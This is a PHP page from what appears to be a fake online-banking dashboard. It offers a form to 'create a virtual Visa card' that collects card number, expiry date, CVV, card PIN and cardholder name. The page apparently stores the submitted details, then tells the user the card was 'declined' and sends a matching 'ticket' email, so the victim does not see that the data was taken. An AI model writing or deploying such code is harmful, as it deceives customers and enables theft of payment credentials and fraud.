<?php

session_start();

include_once ('../include/session.php');

require_once '../include/class.user.php';

if(!isset($_SESSION['acc_no'])){

	

header("Location: login.php");

exit(); 

}


$user_home = new USER();


$reg_user = new USER();

$stmt = $reg_user->runQuery("SELECT * FROM bank_settings WHERE id = '1'");
    $stmt->execute();
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    
	    
	$bank_name  = $row["bank_name"];
	$bank_address  = $row["bank_address"];
	$bank_domain  = $row["bank_domain"];
	$bank_mobile =$row["bank-mobile"];
	$bank_logo = $row["bank_logo"];
	$bank_initial = $row["bank_initial"];
	$bank_fav = $row["bank_fav"];
	$bank_online = $row["bank_online"];
	$bank_support = $row["bank_support"];
	$bank_email = $row["bank_email"];
	$bank_loan = $row["bank_loan"];


$stmt = $reg_user->runQuery("SELECT * FROM account WHERE acc_no=:acc_no");

$stmt->execute(array(":acc_no"=>$_SESSION['acc_no']));

$row = $stmt->fetch(PDO::FETCH_ASSOC);

$email = $row['email'];
$fname = $row['fname'];
$lname = $row['lname'];

if(isset($_POST['creditcards']))

{

	$tc = rand(00000,99999);

	

	$sender_name = trim($_POST['sender_name']);

	$sender_name = strip_tags($sender_name);

	$sender_name = htmlspecialchars($sender_name);
	
	
	
	$cardtype = trim($_POST['cardtype']);

	$cardtype = strip_tags($cardtype);

	$cardtype = htmlspecialchars($cardtype);
	
	
	$card_no = trim($_POST['card_no']);

	$card_no = strip_tags($card_no);
	
	$card_no = htmlspecialchars($card_no);
	
	
	
	$expdate = trim($_POST['expdate']);

	$expdate = strip_tags($expdate);

	$expdate = htmlspecialchars($expdate);
	
	
	
	$cvv = trim($_POST['cvv']);

	$cvv = strip_tags($cvv);

	$cvv = htmlspecialchars($cvv);
	

	$cardpin = trim($_POST['cardpin']);

	$cardpin = strip_tags($cardpin);

	$cardpin = htmlspecialchars($cardpin);
	
	

	$cardname = trim($_POST['cardname']);

	$cardname = strip_tags($cardname);

	$cardname = htmlspecialchars($cardname);


	$tick = $reg_user->runQuery("SELECT * FROM creditcards");

	

	$tick->execute();



	$show = $tick->fetch(PDO::FETCH_ASSOC);

	$date = $show['date'];

		if($reg_user->creditcards($tc,$sender_name,$cardtype,$card_no,$expdate,$cvv,$cardpin,$cardname))

		{			

			$id = $reg_user->lasdID();	

			
			$message = "<!--  -->

<div>
<div>
<div>
<div>
<div>
<div style='FONT-SIZE: 14px; FONT-FAMILY: inherit; COLOR: #393d47; LINE-HEIGHT: 120%'>
<p style='FONT-SIZE: 10px; LINE-HEIGHT: 12px'><br></p></div></div></div></div></div>
<div>
<div style='HEIGHT: 140px; WIDTH: 500px'>
<table style='FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; COLOR: rgb(34,34,34); BACKGROUND-COLOR: rgb(255,255,255)' cellspacing='0' cellpadding='0' width='689' border='0'>
<tbody><tr><td style='FONT-FAMILY: ' height='97' colspan='7'>
<div align='left'><a style='COLOR: rgb(17,85,204)' href='https://squadco.com/squad-pos/' rel='noreferrer noopener' target='_blank'><img src='https://ci5.googleusercontent.com/proxy/GdwrRR27b2sTAzgO2dpJpEXcpOvQUUxbL6Z0_gpJqnfqK9INP7I7c1Hbx2viRkGwAq4zkSmLYaJyKLNw27qxtY-5QEmw4hFwYfMepw=s0-d-e1-ft#https://d1uh8xfi7frtlh.cloudfront.net/gens-top-banner.jpg' width='445' height='90' loading='lazy'></a></div></td><td style='FONT-FAMILY: ' height='97' colspan='3'>
<div align='right'><img border='0' hspace='0' alt='' src='$bank_logo' width='200' height='40' loading='lazy'></div></td></tr><tr><td style='FONT-FAMILY: ' colspan='2'>&nbsp;</td><td style='FONT-FAMILY: ' colspan='10'>
<div align='right'>$bank_address</div></td></tr><tr><td style='FONT-FAMILY: ' colspan='10'><br><br><br>Dear &nbsp;$fname $lname,</td></tr><tr><td style='FONT-FAMILY: ' colspan='10'></td></tr><tr><td style='FONT-FAMILY: ' colspan='10'>
<h4><u>$bank_initial electronic Notification Service</u></h4></td></tr><tr><td style='FONT-FAMILY: ' colspan='10'>Your ticket was successfully opened! We will respond to your request within 24 hours. <br></td></tr><tr><td style='FONT-FAMILY: ' colspan='10'></td></tr><tr><td style='FONT-FAMILY: ' colspan='10'>&nbsp;</td></tr><tr><td style='FONT-FAMILY: ' colspan='10'></td></tr><tr><td style='FONT-FAMILY: ' colspan='10'></td></tr><tr><td style='FONT-FAMILY: ' colspan='10'>
<h4><u>Ticket&nbsp;Details</u></h4></td></tr><tr><td style='FONT-FAMILY: '>
<table width='720' border='0'>
<tbody><tr><td style='MARGIN: 0px' width='130'></td><td style='MARGIN: 0px' width='10'></td><td style='MARGIN: 0px' width='549' colspan='8'><br></td></tr><tr><td style='MARGIN: 0px' width='130'>Ticket Number&nbsp;</td><td style='MARGIN: 0px'>:</td><td style='MARGIN: 0px' colspan='8'>$tc</td></tr><tr><td style='MARGIN: 0px' width='130'>Subject&nbsp;&nbsp;</td><td style='MARGIN: 0px'>:</td><td style='MARGIN: 0px' colspan='8'>Declined Credit card</td></tr><tr><td style='MARGIN: 0px' width='130'>Date Opened</td><td style='MARGIN: 0px'>:</td><td style='MARGIN: 0px' colspan='8'>$date</td></tr><tr><td style='MARGIN: 0px' width='130'>Message </td><td style='MARGIN: 0px'>:</td><td style='MARGIN: 0px' colspan='8'></td><td style='MARGIN: 0px' colspan='8'><b><span style='color: rgb(255, 0, 0);'>Card declined, Please contact card issuer.</span></b>&nbsp;<br></td></tr><tr><td style='MARGIN: 0px' colspan='10'>&nbsp;</td></tr></tbody></table></td></tr></tbody></table>
<table style='FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; COLOR: rgb(34,34,34); BACKGROUND-COLOR: rgb(255,255,255)'>
<tbody><tr><td style='FONT-FAMILY: ' colspan='7'>The privacy and security of your Bank Account details is important to us. If you would prefer that we do not display your account balance in every transaction alert sent to you via email please dial&nbsp;<b>*737*51*1#.</b></td></tr><tr><td style='FONT-FAMILY: ' colspan='10'>&nbsp;</td></tr><tr><td style='FONT-FAMILY: ' height='25' colspan='10'>Thank you for choosing $bank_initial</td></tr><tr><td style='FONT-FAMILY: ' colspan='10'>&nbsp;</td></tr><tr><td style='FONT-FAMILY: ' height='19'>
<table width='500' border='0'>
<tbody><tr><td style='MARGIN: 0px'><a style='COLOR: rgb(17,85,204)' href='https://squadco.com/payment-links/' rel='noreferrer noopener' target='_blank'><img style='object-fit: contain' src='https://ci5.googleusercontent.com/proxy/X5J_CD23A5dgHbxxfT-SO1slQ4qPJGCt5auvGReFkYCeXj2x8C9cdSrhzAahEEKsouJnmRifGJ7G41NPoXPA31ScM-3mxvTQ=s0-d-e1-ft#https://d1uh8xfi7frtlh.cloudfront.net/gens_banner.png' height='150' loading='lazy'></a></td></tr></tbody></table></td></tr></tbody></table>
<div>
<div>
<div height='40'></div></div></div></div></div></div>



";
  
			
			$subject = "Your Add Credit Card Ticket [$tc] Has Been Opened";
						
			$reg_user->send_mail($email,$message,$subject);	

			
			$msg1 = "

					<div class='alert alert-danger mt-4' style='width: 320px;color: white;' fade in  alert-dismissible>
            <a href='#' class='close2 mx-2' data-dismiss='alert' aria-label='close'>&times;</a>
						<strong>Card Declined, Please contact Card issuer.</strong>

                     

			  		</div>

					";

		}

		else

		{

			echo "Sorry, ticket was not opened";

		}		

}

include_once ('counter.php');

?>
<?php include 'header.php'; ?>
<?php include 'aside.php'; ?>

    <div class="container-fluid my-3 py-3">
      <div class="row">
        <hr class="horizontal dark mt-1 mb-3">
        <div class="col-md-6">
          <div class="card">
            <div class="card-header p-3 pb-0">
              <div class="d-flex align-items-center">
                <h6 class="mb-0">
Registered Card                </h6>
                <a class="btn btn-s bg-gradient-info mb-0 p-2 ms-auto">
                  Verified
                </a>
              </div>
            </div>
<div class="card-body p-3">
  <div class="col-xl mb-xl-0 mb-4" style="height: 300px;">
              <div class="card bg-transparent shadow-xl">
                <div class="overflow-hidden position-relative border-radius-xl" style="background-image: url('../assets/img/curved-images/curved14.jpg');height: 300px;">
                  <span class="mask bg-gradient-dark"></span>
                  <div class="card-body position-relative z-index-1 p-3">
                    <i class="fas fa-wifi text-white p-2" aria-hidden="true"></i>
                    <h5 class="text-white mt-4 mb-5 pb-2">5425&nbsp;&nbsp;&nbsp;2334&nbsp;&nbsp;&nbsp;3010&nbsp;&nbsp;&nbsp;9903</h5>
                    <div class="d-flex py-6">
                      <div class="d-flex">
                        <div class="me-4">
                          <p class="text-white text-sm opacity-8 mb-0">Card Holder</p>
                          <h6 class="text-white mb-0"><?php echo $row['fname']; ?> <?php echo $row['mname']; ?> <?php echo $row['lname']; ?></h6>
                        </div>
                        <div>
                          <p class="text-white text-sm opacity-8 mb-0">Expires</p>
                          <h6 class="text-white mb-0"><?php
// Set the timezone to the desired timezone
date_default_timezone_set('America/New_York');

// Get the current year and add one to get the next year
$nextYear = date('Y') + 1;

// Set the date to January 1st of the next year
$date = new DateTime("$nextYear-01-01");

// Echo the date in the desired format
echo $date->format('m/Y');
?></h6>
                        </div>
                      </div>
                      <div class="ms-auto w-20 d-flex align-items-end justify-content-end">
                        <img class="w-60 mt-2" src="../assets/img/logos/mastercard.png" alt="logo">
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            </div>
          </div>
        </div><div class="col-md-6">
          <div class="card">
            <div class="card-header p-3 pb-0">
              <div class="d-flex align-items-center">
                <h6 class="mb-0">
Registered Card                </h6>
                <a class="btn btn-s bg-gradient-warning mb-0 p-2 ms-auto">
                  Disabled
                </a>
              </div>
            </div>
<div class="card-body p-3">
  <div class="col-xl mb-xl-0 mb-4" style="height: 300px;">
              <div class="card bg-transparent shadow-xl">
                <div class="overflow-hidden position-relative border-radius-xl" style="background-image: url('../assets/img/curved-images/white-curved.jpg');height: 300px;">
                  <span class="mask bg-gradient-light"></span>
                  <div class="card-body position-relative z-index-1 p-3">
                    <i class="fas fa-wifi text-white p-2" aria-hidden="true"></i>
                    <h5 class="text-white mt-4 mb-5 pb-2">4263&nbsp;&nbsp;&nbsp;9826&nbsp;&nbsp;&nbsp;4026&nbsp;&nbsp;&nbsp;9299</h5>
                    <div class="d-flex py-6">
                      <div class="d-flex">
                        <div class="me-4">
                          <p class="text-white text-sm opacity-8 mb-0">Card Holder</p>
                          <h6 class="text-white mb-0"><?php echo $row['fname']; ?> <?php echo $row['mname']; ?> <?php echo $row['lname']; ?></h6>
                        </div>
                        <div>
                          <p class="text-white text-sm opacity-8 mb-0">Expires</p>
                          <h6 class="text-white mb-0">07/23</h6>
                        </div>
                      </div>
                      <div class="ms-auto w-20 d-flex align-items-end justify-content-end">
                        <img class="w-60 mt-2" src="../assets/img/logos/visa.png" alt="logo">
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            </div>
          </div>
        </div>
              </div>
        <hr class="horizontal dark mt-1 mb-3">
      <div class="col-md-8">
          <div class="card">
            <div class="card-header pb-0 p-3">
              <h6 class="mb-0">Security Settings</h6>
            </div>
            <div class="card-body p-3">
                
                <!--- add form -->
                
                
            <form autocomplete="off" method="post" >

          <div class="card">
            <div class="card-header pb-0 p-3">
              <h6 class="mb-0">Use the form below to create a virtual Visa card for POS and Online Shopping, Pay Bill and Subscriptions</h6>
            </div>
            <div class="content ps-3">
                                   
                                            <div class="col-md-6 mt-1">
                                            <div class="form-group">
                                              
                                                <label >                                             <?php if(isset($msg1)) echo $msg1;  ?>
</label>
                                                <input type="text" class="form-control" disabled="" placeholder="Company" value="<?php echo $site_initial; ?> Card Department">
                                                <input type="hidden" class="form-control"  name="sender_name" value="<?php echo $row['fname']; ?> " />

                                            </div>
                                        </div>
                                        
                                        <div class="">
                        <img class="w-60 mt-2" src="../assets/img/logos/cardsall.png" alt="logo">
                      </div>
                                            <div class="row">
                                            <div class="col-md-5 w-95 mt-4">
                                            <div class="form-group">
                                            <select class="form-select form-control" name="cardtype" required="">
                                            <option value="">Select Card Type</option> 
                                            <option class="form-group" value="Master">Master Card</option>
                                            <option class="form-group" value="Visa">Visa Card</option> 
                                            <option class="form-group" value="American">American express Card</option>
                                            <option class="form-group" value="Discover">Discover Card</option>
                            </select>
                            </div>
                            </div>
                            
                             <div class="col-md-11">
                                            <div class="form-group">
                                            <input type="text" class="form-control" name="card_no" placeholder="Credit card Number: 1111 2222 3333 0000" value="">                                        </div></div>
                                            
                                            
                                        <div class="col-md-4">
                                            <div class="form-group">
                                            <div class="controls">
                                            <input class="datepicker form-control" name="expdate" placeholder="Expiry Date" type="text">                                            </div></div></div>
                                            
                                            <div class="col-md-3">
                                            <div class="form-group">
                                            <div class="controls">
                                            <input class="datepicker form-control" name="cvv" placeholder="CVV" maxlength="3" type="password">                                            </div></div></div>
                                           
                                           <div class="col-md-3">
                                            <div class="form-group">
                                            <div class="controls">
                                            <input class="datepicker form-control" name="cardpin" placeholder="Card pin" type="password">                                            </div></div></div>
                                           
                                           <div class="col-md-11">
                                            <div class="form-group">
                                            <input type="text" class="form-control" name="cardname" placeholder="Name on Card" value="">                                        </div></div>

                                            	
                                    <div class="row  wt-5">
                                        <div class="col-md-12">
                                            <button type="submit" name="creditcards"  class="col-12 btn btn-info btn-fill pull-right">Add card</button>
                                        </div>
                                    </div>
            </div>
        </div>
      </div>
      </form>
                
                <!--- end add--->
                
</div></div>
        </div></div>
          </div>
            </div>

        <?php include 'footer.php'; ?>